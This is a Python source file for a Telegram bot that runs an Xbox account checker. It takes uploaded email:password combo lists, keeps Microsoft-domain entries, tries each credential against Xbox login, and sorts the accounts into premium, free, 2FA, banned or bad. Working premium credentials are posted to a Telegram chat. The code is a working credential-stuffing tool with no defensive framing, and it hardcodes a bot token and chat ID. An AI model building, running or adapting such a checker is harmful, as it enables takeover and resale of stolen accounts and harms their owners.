import os
import sys
import time
import threading
import queue
import asyncio
import tempfile
import shutil
import re
import traceback
from datetime import datetime
from pathlib import Path
from io import StringIO

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Import original checker
import checker

# Telegram Configuration
BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
CHAT_ID = 8260250818

# Allowed Microsoft domains
ALLOWED_DOMAINS = [
    'hotmail.com',
    'hotmail.co.uk',
    'hotmail.fr',
    'hotmail.de',
    'outlook.com',
    'outlook.co.uk',
    'outlook.fr',
    'outlook.de',
    'live.com',
    'live.co.uk',
    'live.fr',
    'live.de',
    'msn.com',
    'passport.com'
]

# Global variables
task_queue = queue.Queue()
processing_active = False
current_task = None
cancel_flag = False
processing_lock = threading.Lock()
loop = None

class TaskStatus:
    PENDING = "pending"
    PROCESSING = "processing"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"

class ScanTask:
    def __init__(self, file_path, original_name, file_id, chat_id):
        self.file_path = file_path
        self.original_name = original_name
        self.file_id = file_id
        self.chat_id = chat_id
        self.status = TaskStatus.PENDING
        self.result = None
        self.created_at = datetime.now()
        self.completed_at = None
        self.valid_lines = 0
        self.total_lines = 0

def validate_microsoft_domain(email):
    """Check if email is from Microsoft domain"""
    try:
        domain = email.split('@')[-1].lower().strip()
        for allowed in ALLOWED_DOMAINS:
            if domain == allowed or domain.endswith('.' + allowed):
                return True
        return False
    except:
        return False

def validate_and_filter_file(file_path):
    """
    Validate file contains only Microsoft domain emails
    Returns: (filtered_file_path, valid_count, invalid_count, invalid_lines)
    """
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        valid_lines = []
        invalid_lines = []
        
        for line in lines:
            line = line.strip()
            if not line or ':' not in line:
                continue
            
            # Extract email
            email = line.split(':', 1)[0].strip()
            
            if validate_microsoft_domain(email):
                valid_lines.append(line)
            else:
                invalid_lines.append(line)
        
        # Create filtered file
        filtered_dir = tempfile.mkdtemp()
        filtered_path = os.path.join(filtered_dir, 'filtered_' + os.path.basename(file_path))
        
        with open(filtered_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(valid_lines))
        
        return filtered_path, len(valid_lines), len(invalid_lines), invalid_lines[:5]
        
    except Exception as e:
        return None, 0, 0, []

def run_real_checker(file_path, status_callback, cancel_check_callback):
    """
    Run the ACTUAL original checker code on a file
    This executes the REAL XboxChecker class from original code
    """
    try:
        # Create temporary directory for results
        temp_results_dir = tempfile.mkdtemp()
        
        # Monkey patch the original code's file paths to use temp directory
        original_ResultManager_init = checker.ResultManager.__init__
        original_print = checker.print_banner
        original_print_separator = checker.print_separator
        
        # Patch to prevent banner output
        def dummy_print(*args, **kwargs):
            pass
        
        checker.print_banner = dummy_print
        checker.print_separator = dummy_print
        
        def patched_init(self, combo_filename):
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.base_folder = os.path.join(temp_results_dir, timestamp + "_" + combo_filename)
            self.premium_folder = os.path.join(self.base_folder, "premium")
            self.free_folder = os.path.join(self.base_folder, "free")
            self.bad_folder = os.path.join(self.base_folder, "bad")
            Path(self.premium_folder).mkdir(parents=True, exist_ok=True)
            Path(self.free_folder).mkdir(parents=True, exist_ok=True)
            Path(self.bad_folder).mkdir(parents=True, exist_ok=True)
            self.premium_file = os.path.join(self.premium_folder, "premium_accounts.txt")
            self.free_file = os.path.join(self.free_folder, "free_accounts.txt")
            self.bad_file = os.path.join(self.bad_folder, "bad_accounts.txt")
            self.telegram = checker.TelegramSender()
        
        # Apply patch
        checker.ResultManager.__init__ = patched_init
        
        # Override Telegram token in original code
        checker.TELEGRAM_BOT_TOKEN = BOT_TOKEN
        checker.TELEGRAM_CHAT_ID = str(CHAT_ID)
        
        # Read accounts
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
        
        if not lines:
            return {"status": "error", "error": "No valid accounts in file"}
        
        stats = {
            "total": len(lines),
            "checked": 0,
            "premium": 0,
            "free": 0,
            "bad": 0,
            "expired": 0,
            "banned": 0,
            "2fa": 0,
            "errors": 0
        }
        
        premium_results = []
        free_results = []
        
        # Create result manager
        result_manager = checker.ResultManager(os.path.basename(file_path).replace('.txt', ''))
        
        # Process each account
        for idx, line in enumerate(lines, 1):
            # Check cancellation
            if cancel_check_callback and cancel_check_callback():
                status_callback("🛑 Scan cancelled by user")
                return {"status": "cancelled", "stats": stats}
            
            try:
                if ':' not in line:
                    stats["bad"] += 1
                    stats["checked"] += 1
                    status_callback(f"[{stats['checked']}/{stats['total']}] ❌ Invalid format")
                    continue
                
                parts = line.split(':', 1)
                email = parts[0].strip()
                password = parts[1].strip()
                
                # Send status update
                status_callback(f"[{stats['checked']+1}/{stats['total']}] 🔍 Checking: {email[:30]}...")
                
                # Create checker instance
                xbox_checker = checker.XboxChecker(debug=False)
                
                # Run check
                result = xbox_checker.check(email, password)
                status = result['status']
                data = result.get('data', {})
                
                # Update stats
                if status == "PREMIUM":
                    stats["premium"] += 1
                    premium_results.append((email, password, data))
                    status_callback(f"[{stats['checked']+1}/{stats['total']}] ✅ PREMIUM FOUND! - {email[:30]}")
                elif status == "FREE":
                    stats["free"] += 1
                    free_results.append((email, password, data))
                    status_callback(f"[{stats['checked']+1}/{stats['total']}] 🆓 FREE - {email[:30]}")
                elif status == "EXPIRED":
                    stats["expired"] += 1
                    stats["bad"] += 1
                    status_callback(f"[{stats['checked']+1}/{stats['total']}] ⏰ EXPIRED - {email[:30]}")
                elif status == "BANNED":
                    stats["banned"] += 1
                    stats["bad"] += 1
                    status_callback(f"[{stats['checked']+1}/{stats['total']}] 🚫 BANNED - {email[:30]}")
                elif status == "2FACTOR":
                    stats["2fa"] += 1
                    stats["bad"] += 1
                    status_callback(f"[{stats['checked']+1}/{stats['total']}] 🔐 2FA REQUIRED - {email[:30]}")
                else:
                    stats["bad"] += 1
                    status_callback(f"[{stats['checked']+1}/{stats['total']}] ❌ BAD - {email[:30]}")
                
                # Save result using original method
                result_manager.save_result(email, password, result)
                stats["checked"] += 1
                
                # Small delay to avoid rate limiting
                time.sleep(0.3)
                
            except Exception as e:
                stats["errors"] += 1
                stats["bad"] += 1
                stats["checked"] += 1
                status_callback(f"[{stats['checked']}/{stats['total']}] ⚠️ ERROR: {str(e)[:50]}")
        
        # Read saved results
        premium_content = ""
        free_content = ""
        
        try:
            if os.path.exists(result_manager.premium_file):
                with open(result_manager.premium_file, 'r') as f:
                    premium_content = f.read()
        except:
            pass
        
        try:
            if os.path.exists(result_manager.free_file):
                with open(result_manager.free_file, 'r') as f:
                    free_content = f.read()
        except:
            pass
        
        # Restore original functions
        checker.ResultManager.__init__ = original_ResultManager_init
        checker.print_banner = original_print
        checker.print_separator = original_print_separator
        
        return {
            "status": "success",
            "stats": stats,
            "premium_content": premium_content,
            "free_content": free_content,
            "temp_dir": temp_results_dir
        }
        
    except Exception as e:
        return {"status": "error", "error": str(e), "traceback": traceback.format_exc()}

def process_queue():
    """Process tasks from queue sequentially"""
    global processing_active, current_task, cancel_flag
    
    while True:
        try:
            if task_queue.empty():
                with processing_lock:
                    processing_active = False
                    current_task = None
                time.sleep(1)
                continue
            
            with processing_lock:
                current_task = task_queue.get()
                processing_active = True
                cancel_flag = False
            
            current_task.status = TaskStatus.PROCESSING
            
            # Send start message
            asyncio.run_coroutine_threadsafe(
                send_processing_start(current_task),
                loop
            )
            
            # Status callback function
            def status_callback(message):
                asyncio.run_coroutine_threadsafe(
                    send_processing_update(current_task, message),
                    loop
                )
            
            # Cancel check function
            def cancel_check():
                return cancel_flag
            
            # Run REAL checker
            result = run_real_checker(current_task.file_path, status_callback, cancel_check)
            
            if result.get("status") == "success":
                current_task.result = result
                current_task.status = TaskStatus.COMPLETED
                
                # Send final receipt
                asyncio.run_coroutine_threadsafe(
                    send_final_receipt(current_task, result["stats"], result["premium_content"], result["free_content"]),
                    loop
                )
            elif result.get("status") == "cancelled":
                current_task.status = TaskStatus.CANCELLED
                asyncio.run_coroutine_threadsafe(
                    send_cancelled_message(current_task),
                    loop
                )
            else:
                current_task.status = TaskStatus.FAILED
                current_task.result = result
                asyncio.run_coroutine_threadsafe(
                    send_error_message(current_task, result.get("error", "Unknown error")),
                    loop
                )
            
            # Cleanup temp files
            if current_task.file_path and os.path.exists(current_task.file_path):
                try:
                    shutil.rmtree(os.path.dirname(current_task.file_path))
                except:
                    pass
            
            if result and result.get("temp_dir"):
                try:
                    shutil.rmtree(result["temp_dir"])
                except:
                    pass
            
            # Mark task as done
            task_queue.task_done()
            
        except Exception as e:
            if current_task:
                current_task.status = TaskStatus.FAILED
                asyncio.run_coroutine_threadsafe(
                    send_error_message(current_task, str(e)),
                    loop
                )
                task_queue.task_done()
            time.sleep(1)

async def send_processing_start(task):
    """Send message when processing starts"""
    message = (
        f"🚀 **XBOX CHECKER ACTIVE**\n\n"
        f"📄 **File:** `{task.original_name}`\n"
        f"⏰ **Started:** {task.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"🔄 **Real-time monitoring active...**\n"
        f"⏳ Processing accounts..."
    )
    await app.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)

async def send_processing_update(task, update_text):
    """Send real-time progress updates"""
    try:
        await app.bot.send_message(
            chat_id=CHAT_ID,
            text=f"📡 `{update_text}`",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

async def send_final_receipt(task, stats, premium_content, free_content):
    """Send final results receipt"""
    
    # Create receipt message
    receipt = (
        f"✅ **XBOX SCAN COMPLETE**\n\n"
        f"📄 **File:** `{task.original_name}`\n"
        f"⏱️ **Duration:** {(datetime.now() - task.created_at).total_seconds():.1f} seconds\n\n"
        f"📊 **FINAL RESULTS**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔢 **Total Checked:** `{stats['checked']}/{stats['total']}`\n"
        f"✅ **PREMIUM HITS:** `{stats['premium']}`\n"
        f"🆓 **FREE:** `{stats['free']}`\n"
        f"⏰ **EXPIRED:** `{stats['expired']}`\n"
        f"🚫 **BANNED:** `{stats['banned']}`\n"
        f"🔐 **2FA:** `{stats['2fa']}`\n"
        f"❌ **BAD:** `{stats['bad']}`\n"
        f"⚠️ **ERRORS:** `{stats['errors']}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    
    await app.bot.send_message(chat_id=CHAT_ID, text=receipt, parse_mode=ParseMode.MARKDOWN)
    
    # Send premium accounts if any
    if stats['premium'] > 0 and premium_content:
        premium_msg = f"🎮 **PREMIUM ACCOUNTS FOUND ({stats['premium']})**\n\n"
        premium_msg += f"```\n{premium_content[:4000]}\n```"
        if len(premium_content) > 4000:
            premium_msg += "\n*(truncated, check full results)*"
        
        await app.bot.send_message(
            chat_id=CHAT_ID,
            text=premium_msg,
            parse_mode=ParseMode.MARKDOWN
        )
    
    # Queue next file message
    remaining = task_queue.qsize()
    if remaining > 0:
        await app.bot.send_message(
            chat_id=CHAT_ID,
            text=f"📁 **Next in queue:** {remaining} file(s) waiting\n⏳ Processing next file automatically...",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await app.bot.send_message(
            chat_id=CHAT_ID,
            text="✨ **Queue empty!** Send more .txt files with Microsoft accounts to scan.",
            parse_mode=ParseMode.MARKDOWN
        )

async def send_error_message(task, error):
    """Send error message"""
    message = (
        f"❌ **ERROR**\n\n"
        f"📄 File: `{task.original_name}`\n"
        f"🔴 Status: Failed\n\n"
        f"**Error:**\n`{error[:500]}`"
    )
    await app.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)

async def send_cancelled_message(task):
    """Send cancellation message"""
    message = (
        f"🛑 **SCAN CANCELLED**\n\n"
        f"📄 File: `{task.original_name}`\n"
        f"⏹️ Processing stopped by user."
    )
    await app.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    welcome_msg = (
        "🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
        "Send me a `.txt` file with accounts in `email:password` format\n\n"
        "**Requirements:**\n"
        "• Only Microsoft domains allowed:\n"
        "  `hotmail.com`, `outlook.com`, `live.com`, `msn.com`\n\n"
        "**Features:**\n"
        "✓ Real Xbox account validation\n"
        "✓ Premium subscription detection\n"
        "✓ Auto-queue for multiple files\n"
        "✓ Live progress updates\n"
        "✓ Cancel active scan with /cancel\n\n"
        "**Commands:**\n"
        "/start - Show this message\n"
        "/status - Check queue status\n"
        "/cancel - Cancel current scan\n\n"
        "Send any .txt file to begin!"
    )
    await update.message.reply_text(welcome_msg, parse_mode=ParseMode.MARKDOWN)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    with processing_lock:
        queue_size = task_queue.qsize()
        is_processing = processing_active
    
    if is_processing and current_task:
        msg = (
            f"📊 **Queue Status**\n\n"
            f"🔄 **Currently Scanning:** `{current_task.original_name}`\n"
            f"⏳ **Queue Size:** `{queue_size}` files\n"
            f"📅 **Started:** {current_task.created_at.strftime('%H:%M:%S')}\n\n"
            f"Use `/cancel` to stop current scan."
        )
    else:
        msg = (
            f"📊 **Queue Status**\n\n"
            f"💤 **Idle** - No active scans\n"
            f"⏳ **Queue Size:** `{queue_size}` files\n\n"
            f"Send a .txt file to start!"
        )
    
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cancel command - PROPERLY cancels active scan"""
    global cancel_flag, processing_active
    
    with processing_lock:
        if processing_active and current_task:
            cancel_flag = True
            msg = f"🛑 **Cancelling scan for:** `{current_task.original_name}`\n\nPlease wait while current account finishes..."
            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("No active scan to cancel.")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming .txt files with validation"""
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file with accounts in `email:password` format.")
        return
    
    # Download file
    file = await context.bot.get_file(document.file_id)
    
    # Create temp file
    temp_dir = tempfile.mkdtemp()
    temp_path = os.path.join(temp_dir, document.file_name)
    await file.download_to_drive(temp_path)
    
    # Validate domain
    filtered_path, valid_count, invalid_count, invalid_examples = validate_and_filter_file(temp_path)
    
    if valid_count == 0:
        await update.message.reply_text(
            f"❌ **File Rejected**\n\n"
            f"No valid Microsoft accounts found.\n\n"
            f"**Allowed domains:**\n"
            f"hotmail.com, outlook.com, live.com, msn.com\n\n"
            f"Please send a file with only Microsoft email accounts.",
            parse_mode=ParseMode.MARKDOWN
        )
        shutil.rmtree(temp_dir)
        return
    
    # Create warning message for invalid lines
    warning = ""
    if invalid_count > 0:
        warning = f"\n⚠️ **Skipped:** {invalid_count} non-Microsoft account(s)"
        if invalid_examples:
            warning += f"\n   Examples: {', '.join([e.split(':',1)[0] for e in invalid_examples[:3]])}"
    
    # Count total accounts in filtered file
    with open(filtered_path, 'r', encoding='utf-8') as f:
        total_accounts = len([l for l in f.readlines() if l.strip() and ':' in l])
    
    # Create task with filtered file
    task = ScanTask(
        file_path=filtered_path,
        original_name=document.file_name,
        file_id=document.file_id,
        chat_id=update.effective_chat.id
    )
    task.total_lines = total_accounts
    task.valid_lines = valid_count
    
    # Add to queue
    task_queue.put(task)
    
    queue_size = task_queue.qsize()
    
    await update.message.reply_text(
        f"✅ **File Accepted!**\n\n"
        f"📄 `{document.file_name}`\n"
        f"🔢 **Valid Microsoft Accounts:** `{total_accounts}`{warning}\n"
        f"📊 **Queue Position:** `{queue_size}`\n\n"
        f"🔄 **Xbox Checker will now validate each account.**\n"
        f"📡 Live results will appear here...\n\n"
        f"Use `/status` to check progress\n"
        f"Use `/cancel` to stop scanning",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Start processing if not already running
    with processing_lock:
        if not processing_active:
            thread = threading.Thread(target=process_queue, daemon=True)
            thread.start()

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    print(f"Error: {context.error}")
    if update and update.effective_chat:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚠️ An error occurred. Please try again."
        )

def main():
    """Main entry point"""
    global app, loop
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    loop = asyncio.get_event_loop()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_error_handler(error_handler)
    
    # Start bot
    print("🤖 Xbox Checker Bot started!")
    print(f"Bot Token: {BOT_TOKEN[:15]}...")
    print(f"Allowed domains: {', '.join(ALLOWED_DOMAINS[:5])}...")
    print("Waiting for .txt files...")
    app.run_polling()

if __name__ == "__main__":
    main()
